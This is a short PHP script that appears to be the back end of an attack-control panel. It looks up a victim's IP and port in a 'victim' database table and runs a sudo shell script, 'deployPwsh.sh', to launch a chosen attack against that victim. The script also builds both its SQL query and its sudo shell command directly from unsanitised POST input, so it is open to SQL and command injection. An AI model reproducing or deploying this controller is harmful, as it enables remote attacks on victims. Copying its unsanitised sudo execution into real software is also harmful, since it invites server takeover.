<html>
<pre>
<?php
require 'connect.php';

$user = $_POST['userName'];
$attack = $_POST['attack'];
$sql = "SELECT CurrentIP, CurrentPort FROM victim WHERE UserName='".$user."'";
$result = $conn->query($sql);
if ($result->num_rows > 0) {
    // output data of each row
    while($row = $result->fetch_assoc()) {
        //gets the ip and port for the selected user
        $ip = $row['CurrentIP'];
        $port = $row['CurrentPort'];
    }
}else{
    echo "ERROR";
}
# this works now
$command ="sudo /var/www/html/deployPwsh.sh ".$attack." ".$user." ".$ip." ".$port;
echo (shell_exec($command));
?>
</pre>
</html>